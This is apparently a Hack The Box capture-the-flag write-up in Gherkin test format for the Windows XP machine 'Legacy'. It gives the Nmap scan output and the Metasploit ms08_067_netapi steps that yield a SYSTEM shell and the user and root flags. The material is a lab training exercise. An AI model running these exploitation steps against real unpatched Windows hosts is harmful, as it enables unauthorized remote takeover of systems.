## Version 2.0
## language: en

Feature:
  Site:
    Hack The Box
  Category:
    CTF
  User:
    aramirez95
  Goal:
    scale privileges to get two flags that are root and user.

  Background:
  Hacker's software:
    | <Software name> | <Version>   |
    | Kali Linux      | 2020.1	    |
    | Firefox Quantum | 68.2Oesr    |
    | Nmap            | 7.80        |
    | Metasploit      | 5.0.73-dev  |
  Machine information:
    Given I am accessing the machine 10.10.10.4
    And is running on Windows

  Scenario: Information gathering
  
    Given that I run the following Nmap command
    """
    nmap -sC -sV 10.10.10.4
    """
    Then I get the output
    """
    Starting Nmap 7.80 ( https://nmap.org ) at 
    2020-02-24 20:57 -05
    Nmap scan report for 10.10.10.4
    Host is up (0.18s latency).
    Not shown: 997 filtered ports
    PORT     STATE  SERVICE       VERSION
    139/tcp  open   netbios-ssn   Microsoft Windows 
    netbios-ssn
    445/tcp  open   microsoft-ds  Windows XP microsoft-ds
    3389/tcp closed ms-wbt-server 
    Service Info: OSs: Windows, Windows XP; CPE: 
    cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

    Host script results:
    |_clock-skew: mean: 5d00h59m32s, deviation: 1h24m50s, 
      median: 4d23h59m32s
    |_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, 
      NetBIOS MAC: 00:50:56:b9:9f:6b (VMware)
    | smb-os-discovery: 
    |   OS: Windows XP (Windows 2000 LAN Manager)
    |   OS CPE: cpe:/o:microsoft:windows_xp::-
    |   Computer name: legacy
    |   NetBIOS computer name: LEGACY\x00
    |   Workgroup: HTB\x00
    |_  System time: 2020-03-01T05:57:21+02:00
    | smb-security-mode: 
    |   account_used: <blank>
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    |_smb2-time: Protocol negotiation failed (SMB2)
    """

    Then I can see that it has a port 445 and 139, so it 
    is using NetBios and SMB services
    

  Scenario: Exploitation
    Since the machine has SMB and NetBios services 
    Then he decided to run metasploit to use an exploit that 
    allows me to execute remote code as a root user and is 
    the following
    """
    use use exploit/windows/smb/ms08_067_netapi
    """
    then I do the RHOST configuration like this
    """
    set RHOST 10.10.10.4
    """
    and I execute an instruction to run the exploit and 
    it is this
    """
    exploit
    """
    Then I can execute commands and i use one that will
    tell me user permissions
    """
    getuid
    """
    so I know I have permits admin because it came out
    """
    NT AUTHORITY\SYSTEM
    """
    Then I execute another instruction to know where I am 
    located and is this
    """
    pwd
    """
    then I realize that I am located in C:\WINDOWS\system32
    and with another instruction I stop at C:\
    """
    cd ../..
    """
    then in C:\ I decide to execute another instruction to 
    search all the files with extension .txt
    """
    search -f *.txt
    """
    then I realize that the root.txt and user.txt files that 
    FLAGS have are in these paths
    """
    c:\Document and Settings\Administrator\Desktop\root.txt
    c:\Document and Settings\john\Desktop\user.txt
    """
    and finally to get the FLAGS we use the following 
    instruction
    """
    cat root.txt
    cat user.txt
    """
    